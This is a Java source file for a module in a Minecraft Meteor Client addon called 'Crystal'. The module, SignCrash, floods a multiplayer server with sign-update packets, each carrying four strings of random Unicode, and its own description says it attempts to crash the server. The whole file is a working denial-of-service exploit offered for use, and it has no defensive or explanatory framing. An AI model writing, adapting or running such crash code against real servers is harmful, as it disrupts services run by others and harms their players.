package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;

import java.util.Random;

public class SignCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("The number of packets to send per tick.")
            .defaultValue(38)
            .min(1)
            .sliderMax(100)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Automatically disables the module on server kick.")
            .defaultValue(true)
            .build()
    );

    public SignCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY, "sign-crash", "CRYSTAL || Attempts to crash the server by spamming sign update packets. (By 0x150)");
    }

    private String rndBinStr() {
        StringBuilder end = new StringBuilder();
        for (int i = 0; i < 598; i++) end.append((char) (new Random().nextInt(0xFFFF)));
        return end.toString();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < packets.get(); i++)
            mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
                    mc.player.getBlockPos(),
                    true,
                    rndBinStr(),
                    rndBinStr(),
                    rndBinStr(),
                    rndBinStr()));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}